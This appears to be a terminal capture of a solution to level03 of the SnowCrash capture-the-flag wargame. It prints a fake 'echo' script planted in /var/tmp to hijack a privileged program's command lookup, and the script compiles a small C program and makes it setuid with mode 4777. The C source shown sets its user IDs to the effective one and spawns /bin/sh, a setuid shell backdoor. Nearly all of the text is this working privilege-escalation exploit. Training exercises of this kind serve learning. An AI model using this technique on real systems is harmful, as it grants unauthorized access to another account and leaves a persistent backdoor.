level03@SnowCrash:~$ cat /var/tmp/echo
#!/bin/sh

echo `id`
cd /var/tmp
gcc /var/tmp/suflag.c -o /var/tmp/suflag
chmod 4777 /var/tmp/suflag

chmod 777 /var/tmp/echo 

level03@SnowCrash:~$ id flag03
uid=3003(flag03) gid=3003(flag03) groups=3003(flag03),1001(flag)

level03@SnowCrash:~$ cat /var/tmp/suflag.c
int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system("/bin/sh");
}
